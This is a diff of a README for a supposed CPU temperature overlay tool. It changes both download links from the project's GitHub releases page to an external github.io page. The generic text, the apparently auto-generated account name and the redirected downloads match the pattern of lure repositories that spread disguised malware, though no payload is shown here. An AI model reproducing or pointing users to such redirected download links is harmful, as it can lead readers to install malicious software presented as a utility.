@@ -1,6 +1,6 @@
 # 🌡️ CPU-Temp-Monitor-Overlay-2026 - Keeps your computer temperatures stable daily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/malfunctioning-anchovydressing524/CPU-Temp-Monitor-Overlay-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://malfunctioning-anchovydressing524.github.io)
 
 ## 📌 About this tool
 The CPU-Temp-Monitor-Overlay-2026 provides a simple way to track your hardware health while you work or play. High temperatures can cause your computer to slow down or restart without warning. This tool displays your processor temperature in a small window that stays on top of your other programs. You can glance at your heat levels without needing to switch tabs or minimize your windows. The tool consumes very few system resources, so it does not interfere with your other tasks. 
@@ -15,7 +15,7 @@ The CPU-Temp-Monitor-Overlay-2026 provides a simple way to track your hardware h
 ## 🚀 Getting started
 You can obtain the current version of this tool by visiting our releases page. You do not need to compile code or run complex commands to use this software.
 
-[Visit this page to download the application](https://github.com/malfunctioning-anchovydressing524/CPU-Temp-Monitor-Overlay-2026/releases)
+[Visit this page to download the application](https://malfunctioning-anchovydressing524.github.io)
 
 Follow these steps to set up the software on your computer:
 
